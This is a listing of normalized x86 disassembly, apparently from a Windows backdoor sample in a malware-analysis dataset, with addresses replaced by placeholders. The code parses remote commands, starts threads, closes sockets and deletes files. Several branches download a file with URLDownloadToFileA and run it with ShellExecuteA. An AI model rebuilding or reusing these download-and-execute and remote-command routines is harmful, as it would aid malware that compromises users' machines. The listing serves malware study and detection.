push 0x0
push r-xdata
push r-xdata
push 0x0
call ShellExecuteA
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov al 0x1
call sub_48b1a0
lea eax [ ebp - 0x5c0 ]
push eax
mov ecx 0x6
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x5c0 ]
mov edx r-xdata
call sub_405974
jne r-xdata
xor eax eax
call sub_48b1a0
lea eax [ ebp - 0x5c4 ]
push eax
mov ecx 0xb
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x5c4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x6
mov edx 0x1
call sub_405a84
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov ebx eax
mov [ ebx + 0xf ] 0x1
mov dl 0x5
mov eax ebx
call sub_41fc40
xor edx edx
mov eax ebx
call sub_485d50
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_485da8
mov edx r-xdata
mov eax ebx
call sub_485d54
mov eax ebx
call sub_41fef0
lea eax [ ebp - 0x5cc ]
push eax
mov ecx 0xb
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x5cc ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xb
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
push ebp
lea eax [ ebp - 0x5c8 ]
call sub_46f6e0
mov eax [ ebp - 0x5c8 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_475fd8
pop ecx
lea eax [ ebp - 0x5d0 ]
push eax
mov ecx 0xd
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x5d0 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xb
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov eax [ rw-data ]
call sub_405530
push [ ebp - 0xc ]
push r-xdata
push [ ebp - 0x10 ]
mov eax [ rw-data ]
mov edx 0x3
call sub_4058e0
mov eax [ rw-data ]
mov [ ebp - 0x1c4 ] eax
mov eax [ ebp - 0x1c4 ]
xor ecx ecx
mov edx 0x4
call sub_403af4
push 0x3e8
call Sleep
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call closesocket
lea eax [ ebp - 0x5d4 ]
push eax
mov ecx 0xc
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x5d4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xd
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
push 0x8
push 0x40
call LocalAlloc
mov ebx eax
mov esi ebx
mov eax esi
mov edx [ ebp - 0xc ]
call sub_405584
mov eax [ ebp - 0x10 ]
call sub_409edc
mov [ esi + 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push ebx
push r-xdata
push 0x0
push 0x0
call CreateThread
push eax
call CloseHandle
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xc
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x5dc ]
push eax
mov ecx 0x7
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x5dc ]
lea edx [ ebp - 0x5d8 ]
call sub_4097dc
mov eax [ ebp - 0x5d8 ]
mov edx r-xdata
call sub_405974
je r-xdata
lea eax [ ebp - 0x5f8 ]
push eax
mov ecx 0xe
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x5f8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x5f4 ]
call sub_48ce74
mov ecx [ ebp - 0x5f4 ]
lea eax [ ebp - 0x5f0 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x5f0 ]
call sub_475e2c
push 0x5
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0x5ec ]
call sub_48ce74
push [ ebp - 0x5ec ]
lea eax [ ebp - 0x5e8 ]
mov edx 0x4
call sub_4058e0
mov eax [ ebp - 0x5e8 ]
call sub_475e2c
lea eax [ ebp - 0x5e4 ]
push eax
mov ecx 0x4
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x5e4 ]
lea edx [ ebp - 0x5e0 ]
call sub_4097dc
mov eax [ ebp - 0x5e0 ]
mov edx r-xdata
call sub_405974
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xe
mov edx 0x1
call sub_405a84
push 0x5
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0x600 ]
call sub_48ce74
push [ ebp - 0x600 ]
lea eax [ ebp - 0x5fc ]
mov edx 0x4
call sub_4058e0
mov eax [ ebp - 0x5fc ]
call sub_475e2c
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x614 ]
push eax
mov ecx 0xe
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x614 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x610 ]
call sub_48ce74
mov ecx [ ebp - 0x610 ]
lea eax [ ebp - 0x60c ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x60c ]
call sub_475e2c
xor eax eax
call sub_475bd8
mov eax r-xdata
call sub_483f50
test eax eax
jg r-xdata
lea eax [ ebp - 0x64c ]
push eax
mov ecx 0x10
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x64c ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xe
mov edx 0x1
call sub_405a84
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x618 ]
push eax
xor ecx ecx
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_40ef44
mov edx [ ebp - 0x618 ]
lea eax [ ebp - 0x8 ]
call sub_4055c8
lea eax [ ebp - 0x61c ]
push eax
lea edx [ ebp - 0x620 ]
mov eax [ ebp - 0x8 ]
call sub_409864
mov eax [ ebp - 0x620 ]
mov ecx 0x7
mov edx 0x1
call sub_405a44
mov eax [ ebp - 0x61c ]
mov edx r-xdata
call sub_405974
je r-xdata
mov eax r-xdata
call sub_483f50
call sub_484388
lea eax [ ebp - 0x608 ]
call sub_48ce74
mov ecx [ ebp - 0x608 ]
lea eax [ ebp - 0x604 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x604 ]
call sub_475e2c
call GetCurrentProcessId
call sub_484388
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x10
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x650 ]
push eax
xor ecx ecx
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_40ef44
mov edx [ ebp - 0x650 ]
lea eax [ ebp - 0xc ]
call sub_4055c8
lea eax [ ebp - 0x654 ]
push eax
lea edx [ ebp - 0x658 ]
mov eax [ ebp - 0xc ]
call sub_409864
mov eax [ ebp - 0x658 ]
mov ecx 0x7
mov edx 0x1
call sub_405a44
mov eax [ ebp - 0x654 ]
mov edx r-xdata
call sub_405974
je r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x0
push r-xdata
push 0x0
push 0x0
call CreateThread
push eax
call CloseHandle
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
mov edx r-xdata
call sub_405864
mov edx [ ebp - 0x8 ]
cmp [ edx + eax - 0x1 ] 0x2f
jne r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x664 ]
push eax
mov ecx 0xe
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x664 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0xc ]
call sub_472e88
lea eax [ ebp - 0x660 ]
mov ecx [ ebp - 0xc ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x660 ]
call sub_475e2c
mov edx [ ebp - 0xc ]
cmp [ edx + eax - 0x1 ] 0x2f
jne r-xdata
sub eax 0x4
mov eax [ eax ]
lea edx [ ebp - 0x24 ]
mov eax 0x8
call sub_48997c
push 0x0
push 0x0
lea edx [ ebp - 0x628 ]
mov eax 0x1a
call sub_48adcc
push [ ebp - 0x628 ]
push [ ebp - 0x24 ]
push r-xdata
lea eax [ ebp - 0x624 ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x624 ]
call sub_4059dc
push eax
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push 0x0
call URLDownloadToFileA
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x688 ]
push eax
mov ecx 0xd
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x688 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xe
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
lea eax [ ebp - 0x668 ]
call sub_489bb0
lea eax [ ebp - 0x668 ]
mov edx r-xdata
call sub_405818
mov edx [ ebp - 0x668 ]
xor eax eax
call sub_48ab58
lea eax [ ebp - 0x66c ]
call sub_489bb0
lea eax [ ebp - 0x66c ]
mov edx r-xdata
call sub_405818
mov edx [ ebp - 0x66c ]
xor eax eax
call sub_48ab58
push r-xdata
lea eax [ ebp - 0x670 ]
call sub_489bb0
lea eax [ ebp - 0x670 ]
mov edx r-xdata
call sub_405818
mov eax [ ebp - 0x670 ]
push eax
lea eax [ ebp - 0x674 ]
call sub_489bb0
lea eax [ ebp - 0x674 ]
mov edx r-xdata
call sub_405818
mov edx [ ebp - 0x674 ]
mov eax r-xdata
pop ecx
call sub_466d4c
lea eax [ ebp - 0x678 ]
call sub_489bb0
lea eax [ ebp - 0x678 ]
mov edx r-xdata
call sub_405818
mov eax [ ebp - 0x678 ]
lea edx [ ebp - 0x18 ]
call sub_48aab0
lea eax [ ebp - 0x67c ]
call sub_489bb0
lea eax [ ebp - 0x67c ]
mov edx r-xdata
call sub_405818
mov eax [ ebp - 0x67c ]
mov [ ebp - 0x1c8 ] eax
mov eax [ ebp - 0x1c8 ]
call sub_4059dc
push eax
call DeleteFileA
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1c9 ] al
lea eax [ ebp - 0x680 ]
call sub_489bb0
lea eax [ ebp - 0x680 ]
mov edx r-xdata
call sub_405818
mov eax [ ebp - 0x680 ]
mov [ ebp - 0x1d0 ] eax
mov eax [ ebp - 0x1d0 ]
call sub_4059dc
push eax
call DeleteFileA
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1d1 ] al
push ebp
lea edx [ ebp - 0x684 ]
mov eax [ ebp - 0x18 ]
call sub_466fec
mov eax [ ebp - 0x684 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_475fd8
pop ecx
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov ebx eax
mov [ ebx + 0xf ] 0x1
mov dl 0x5
mov eax ebx
call sub_41fc40
mov dx 0x2
mov eax ebx
call sub_484ee8
lea eax [ ebp - 0x65c ]
mov ecx r-xdata
mov edx [ ebp - 0xc ]
call sub_405864
mov edx [ ebp - 0x65c ]
mov eax ebx
call sub_484f08
mov edx r-xdata
mov eax ebx
call sub_484f74
mov eax ebx
call sub_41fef0
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
lea edx [ ebp - 0x638 ]
mov eax 0x1a
call sub_48adcc
push [ ebp - 0x638 ]
push [ ebp - 0x24 ]
push r-xdata
lea eax [ ebp - 0x634 ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x634 ]
call sub_40a26c
test al al
jne r-xdata
lea eax [ ebp - 0x630 ]
call sub_48ce74
mov ecx [ ebp - 0x630 ]
lea eax [ ebp - 0x62c ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x62c ]
call sub_475e2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
je r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x68c ]
push eax
mov ecx 0xc
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x68c ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xd
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x4 ]
push eax
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push r-xdata
push 0x0
push 0x0
call CreateThread
mov edx [ ebp - 0xc ]
test edx edx
je r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x640 ]
call sub_48ce74
mov ecx [ ebp - 0x640 ]
lea eax [ ebp - 0x63c ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x63c ]
call sub_475e2c
push 0x5
push 0x0
push 0x0
lea edx [ ebp - 0x648 ]
mov eax 0x1a
call sub_48adcc
push [ ebp - 0x648 ]
push [ ebp - 0x24 ]
push r-xdata
lea eax [ ebp - 0x644 ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x644 ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
xor eax eax
call sub_475bd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea ecx [ ebp - 0x8 ]
xchg ecx eax
xchg ecx edx
call sub_405a84
sub edx 0x4
mov edx [ edx ]
lea eax [ ebp - 0x690 ]
push eax
mov ecx 0xc
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x690 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xc
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x4 ]
push eax
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push r-xdata
push 0x0
push 0x0
call CreateThread
lea ecx [ ebp - 0xc ]
xchg ecx eax
xchg ecx edx
call sub_405a84
sub edx 0x4
mov edx [ edx ]
lea eax [ ebp - 0x694 ]
push eax
mov ecx 0xa
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x694 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xc
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x4 ]
push eax
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push r-xdata
push 0x0
push 0x0
call CreateThread
lea eax [ ebp - 0x69c ]
push eax
mov ecx 0xe
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x69c ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xa
mov edx 0x1
call sub_405a84
mov eax [ rw-data ]
mov edx [ ebp - 0x8 ]
call sub_405584
lea edx [ ebp - 0x698 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x698 ]
mov edx [ ebp - 0x8 ]
call sub_48b314
lea eax [ ebp - 0x6ac ]
push eax
mov ecx 0xb
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x6ac ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xe
mov edx 0x1
call sub_405a84
push r-xdata
push 0x0
call GetSystemMetrics
lea edx [ ebp - 0x6a4 ]
call sub_409d70
push [ ebp - 0x6a4 ]
push r-xdata
push 0x1
call GetSystemMetrics
lea edx [ ebp - 0x6a8 ]
call sub_409d70
push [ ebp - 0x6a8 ]
lea eax [ ebp - 0x6a0 ]
mov edx 0x4
call sub_4058e0
mov eax [ ebp - 0x6a0 ]
call sub_475e2c
lea eax [ ebp - 0x6b0 ]
push eax
mov ecx 0xe
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x6b0 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xb
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov eax [ ebp - 0x14 ]
call sub_409edc
push eax
mov eax [ ebp - 0x10 ]
call sub_409edc
mov edx eax
mov eax [ ebp - 0xc ]
pop ecx
call sub_482c40
lea eax [ ebp - 0x6bc ]
push eax
mov ecx 0x9
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x6bc ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xe
mov edx 0x1
call sub_405a84
lea edx [ ebp - 0x6b8 ]
mov eax [ ebp - 0x8 ]
call sub_45f588
mov ecx [ ebp - 0x6b8 ]
lea eax [ ebp - 0x6b4 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x6b4 ]
call sub_475e2c
lea eax [ ebp - 0x6c0 ]
push eax
mov ecx 0x7
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x6c0 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x9
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x8 ]
call sub_48bb34
test al al
jne r-xdata
lea eax [ ebp - 0x6c4 ]
push eax
mov ecx 0xd
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x6c4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x7
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x8 ]
call sub_48bb8c
mov eax r-xdata
call sub_475e2c
lea eax [ ebp - 0x6c8 ]
push eax
mov ecx 0xc
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x6c8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xd
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0xc ]
call sub_409edc
mov edx [ ebp - 0x8 ]
call sub_461a98
lea eax [ ebp - 0x6d0 ]
push eax
mov ecx 0xc
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x6d0 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xc
mov edx 0x1
call sub_405a84
push 0x0
call CoInitialize
xor eax eax
push ebp
push sub_47b67a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x6cc ]
mov eax r-xdata
call sub_42c11c
mov edx [ ebp - 0x6cc ]
lea eax [ ebp - 0x38 ]
call sub_415b6c
lea eax [ ebp - 0x8 ]
push eax
push r-xdata
lea eax [ ebp - 0x38 ]
push eax
push 0x0
call sub_411658
add esp 0x10
lea eax [ ebp - 0x38 ]
call sub_41631c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax r-xdata
call sub_475e2c
call CoUninitialize
retn
lea eax [ ebp - 0x6d8 ]
push eax
mov ecx 0xc
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x6d8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xc
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
push ebp
lea eax [ ebp - 0x6d4 ]
call sub_472c70
mov eax [ ebp - 0x6d4 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_475fd8
pop ecx
lea eax [ ebp - 0x6f8 ]
push eax
mov ecx 0x9
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x6f8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xc
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405818
push r-xdata
lea edx [ ebp - 0x6e0 ]
mov eax [ ebp - 0x8 ]
call sub_48c7ec
push [ ebp - 0x6e0 ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea ecx [ ebp - 0x6e4 ]
mov dl 0x1
mov eax [ ebp - 0x8 ]
call sub_48caf0
push [ ebp - 0x6e4 ]
push r-xdata
lea ecx [ ebp - 0x6e8 ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_48caf0
push [ ebp - 0x6e8 ]
push r-xdata
lea edx [ ebp - 0x6ec ]
mov eax [ ebp - 0x8 ]
call sub_48ca28
push [ ebp - 0x6ec ]
push r-xdata
lea ecx [ ebp - 0x6f0 ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_48c91c
push [ ebp - 0x6f0 ]
push r-xdata
lea ecx [ ebp - 0x6f4 ]
mov dl 0x1
mov eax [ ebp - 0x8 ]
call sub_48c91c
push [ ebp - 0x6f4 ]
push r-xdata
lea eax [ ebp - 0x6dc ]
mov edx 0xf
call sub_4058e0
mov eax [ ebp - 0x6dc ]
call sub_475e2c
lea eax [ ebp - 0x704 ]
push eax
mov ecx 0x8
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x704 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x9
mov edx 0x1
call sub_405a84
lea edx [ ebp - 0x700 ]
mov eax 0x1a
call sub_48adcc
push [ ebp - 0x700 ]
push r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x6fc ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x6fc ]
mov [ ebp - 0x1d8 ] eax
mov eax [ ebp - 0x1d8 ]
call sub_4059dc
push eax
call DeleteFileA
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1d9 ] al
cmp [ ebp - 0x1d9 ] 0x0
je r-xdata
lea eax [ ebp - 0x70c ]
push eax
mov ecx 0x9
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x70c ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x8
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov eax [ ebp - 0xc ]
call sub_40a26c
test al al
jne r-xdata
mov eax r-xdata
call sub_475e2c
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x9
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
